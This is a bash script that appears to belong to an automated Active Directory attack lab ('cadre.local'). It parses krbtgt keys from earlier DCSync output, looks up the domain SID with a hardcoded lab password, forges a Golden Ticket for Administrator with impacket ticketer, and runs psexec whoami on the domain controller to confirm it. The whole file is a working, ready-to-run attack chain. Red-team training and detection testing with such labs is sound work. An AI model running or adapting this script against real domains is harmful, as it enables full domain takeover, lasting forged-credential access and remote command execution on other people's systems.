#!/bin/bash
# CADRE — WT#010 Golden Ticket (cadre.local root — post WT#009 DCSync)
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#010 — Golden Ticket"
start_attack "010" "Golden Ticket"

# impacket: system packages use impacket-* prefix; pip --user installs *.py in ~/.local/bin
if command -v impacket-ticketer &>/dev/null; then
  TICKETER() { impacket-ticketer "$@"; }
  LOOKUPSID() { impacket-lookupsid "$@"; }
  PSEXEC() { impacket-psexec "$@"; }
elif command -v ticketer.py &>/dev/null; then
  TICKETER() { ticketer.py "$@"; }
  LOOKUPSID() { lookupsid.py "$@"; }
  PSEXEC() { psexec.py "$@"; }
else
  fail "Required tool not found: ticketer.py or impacket-ticketer"
  exit 1
fi
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"
require_env NETBIOS_ROOT "NETBIOS_ROOT"

DCSYNC_FILE="${ATTACKS_DIR:-.}/dcsync_output.txt"
if [[ ! -f "$DCSYNC_FILE" ]]; then
  DCSYNC_FILE="/home/vagrant/attack-matrix/04-automation/linux/attacks/dcsync_output.txt"
fi

step "Step 1: Parse krbtgt keys from WT#009 output"
KRBTGT_AES256=$(grep -m1 '^krbtgt:aes256-cts-hmac-sha1-96:' "$DCSYNC_FILE" 2>/dev/null | cut -d: -f3)
KRBTGT_HASH=$(grep -E '^krbtgt:[0-9]+:' "$DCSYNC_FILE" 2>/dev/null | head -1 | cut -d: -f4)
if [[ -z "$KRBTGT_AES256" && -z "$KRBTGT_HASH" ]]; then
  echo "ERROR: krbtgt keys not found in $DCSYNC_FILE — run WT009-dcsync.sh first"
  exit 1
fi
if [[ -n "$KRBTGT_AES256" ]]; then
  ok "krbtgt AES256: ${KRBTGT_AES256:0:8}… (Server 2025 — use -aesKey)"
  TICKET_KEY_ARGS="-aesKey $KRBTGT_AES256"
else
  ok "krbtgt NT hash: ${KRBTGT_HASH:0:8}… (RC4 ticket — may fail on AES-only KDC)"
  TICKET_KEY_ARGS="-nthash $KRBTGT_HASH"
fi

step "Step 2: Resolve cadre.local domain SID"
DOMAIN_SID=$(LOOKUPSID "${NETBIOS_ROOT}/chief_command:C0mm@nd_Ch1ef!@${DC01}" 2>/dev/null | grep -m1 'Domain SID' | awk '{print $NF}')
if [[ -z "$DOMAIN_SID" ]]; then
  echo "ERROR: could not resolve domain SID via lookupsid"
  exit 1
fi
ok "Domain SID: $DOMAIN_SID"

step "Step 3: Forge golden ticket (Administrator)"
CCACHE="/tmp/cadre-golden-Administrator.ccache"
rm -f "$CCACHE" Administrator.ccache
run_cmd "cd /tmp && TICKETER $TICKET_KEY_ARGS -domain-sid \"$DOMAIN_SID\" -domain \"$DOMAIN_ROOT\" -user-id 500 Administrator"
if [[ -f /tmp/Administrator.ccache ]]; then
  mv /tmp/Administrator.ccache "$CCACHE"
fi
if [[ ! -f "$CCACHE" ]]; then
  fail "ccache not created"
  exit 1
fi
ok "ccache: $CCACHE"

step "Step 4: Test ticket — Kerberos auth to dc01 (whoami via psexec)"
export KRB5CCNAME="$CCACHE"
run_cmd "KRB5CCNAME=\"$CCACHE\" PSEXEC -k -no-pass -dc-ip \"$DC01\" -target-ip \"$DC01\" \"${DOMAIN_ROOT}/Administrator@dc01.${DOMAIN_ROOT}\" whoami 2>&1"
PSEXEC_RC=$?
if [[ $PSEXEC_RC -ne 0 ]]; then
  fail "psexec with golden ticket failed (rc=$PSEXEC_RC)"
  exit 1
fi

result 0 "Golden Ticket forged and psexec whoami succeeded"
